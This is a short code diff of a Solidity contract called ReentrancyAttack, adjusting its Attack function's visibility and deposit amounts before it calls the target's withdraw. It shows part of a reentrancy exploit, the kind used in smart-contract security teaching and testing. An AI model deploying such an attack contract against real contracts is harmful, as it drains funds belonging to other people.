@@ -16,9 +16,9 @@ contract ReentrancyAttack {
         }
     }
 
-    function Attack() public payable {
-        require(msg.value >= 1, "Insufficient funds");
-        reenter.deposit{value: 10 ether}();
+    function Attack() external payable {
+        require(msg.value >= 1 ether, "Insufficient funds");
+        reenter.deposit{value: 1 ether}();
         reenter.withdraw();
     }
 
